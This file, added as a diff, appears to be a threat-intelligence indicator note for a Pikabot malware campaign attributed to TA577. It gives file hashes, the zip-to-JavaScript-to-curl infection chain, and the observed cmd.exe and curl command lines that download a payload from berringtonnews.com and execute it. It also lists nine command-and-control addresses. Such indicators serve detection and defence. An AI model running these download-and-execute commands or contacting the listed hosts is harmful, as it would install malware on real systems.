@@ -1,0 +1,65 @@
+12.02.2024 | Pikabot | TA577 | 1.1.17-ghost
+
+*************************************************
+
+.js ce616c5d472d8d22169e1cabd8c99a511394b1c28febc944f427137a0354e8db
+.exe f4be945a6678a11bc4d2e3819cba8b91665eaf99e152cf0348e16d1fd94b2e75
+
+*************************************************
+
+zip > js > curl > .dll
+
+C:\Windows\system32\wscript.exe
+
+wscript.exe C:\Users\Admin\AppData\Local\Temp\magic.js
+
+cmd.exe /c mkdir  C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf & curl https://berringtonnews.com/0bvKZ/0.16410464051883017.dat --output C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf\Ahjukktdtdj.exe
+
+curl https://berringtonnews.com/0bvKZ/0.16410464051883017.dat --output C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf\Ahjukktdtdj.exe
+
+cmd.exe /c mkdir  C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf & curl 0.2432647238430553.dat --output C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf\Ahjukktdtdj.exe
+
+curl 0.2432647238430553.dat --output C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf\Ahjukktdtdj.exe
+
+cmd.exe /c mkdir  C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf & curl 0.34472296273090125.dat --output C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf\Ahjukktdtdj.exe
+
+curl  0.34472296273090125.dat --output C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf\Ahjukktdtdj.exe
+
+cmd.exe /c mkdir  C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf & curl 0.08171440546460101.dat --output C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf\Ahjukktdtdj.exe
+
+curl 0.08171440546460101.dat --output C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf\Ahjukktdtdj.exe
+
+cmd.exe /c mkdir  C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf & curl 0.9420635864377069.dat --output C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf\Ahjukktdtdj.exe
+
+curl 0.9420635864377069.dat --output C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf\Ahjukktdtdj.exe
+
+cmd.exe /c mkdir  C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf & curl 0.6819786227237544.dat --output C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf\Ahjukktdtdj.exe
+
+curl 0.6819786227237544.dat --output C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf\Ahjukktdtdj.exe
+
+cmd.exe /c timeout 10 & C:\Ctjhkhgkgkdfhd\Djgkgkdfhdjf\Ktdhtfjfhdffkf\Ahjukktdtdj.exe
+
+timeout  10 
+
+*************************************************
+
+**** .dll distro ****
+
+https://berringtonnews.com/0bvKZ/0.16410464051883017.dat
+
+
+*************************************************
+
+c2's
+
+https://37.60.242.86:2967
+https://23.226.138.161:5242
+https://37.60.242.85:9785
+https://86.38.225.108:2226
+https://178.18.246.136:2078
+https://86.38.225.106:2221
+https://86.38.225.105:13721
+https://23.226.138.143:2083
+https://85.239.243.155:5000
+
+*************************************************
